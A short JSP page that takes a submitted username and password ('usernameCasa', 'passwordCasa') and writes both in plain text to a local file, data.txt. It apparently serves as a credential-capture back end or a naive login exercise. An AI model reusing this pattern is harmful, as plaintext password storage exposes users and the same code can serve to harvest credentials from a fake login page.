<%@ page import="java.io.*"  %>
<%

String user = request.getParameter("usernameCasa");
String pass = request.getParameter("passwordCasa");

String filetxt = "data.txt";

try {   
    PrintWriter pw = new PrintWriter(new FileOutputStream(filetxt));
    pw.println(user);
    pw.println("----------------");
    pw.println(pass);

    pw.close();
} catch(IOException e) {
   out.println(e.getMessage());
}

%>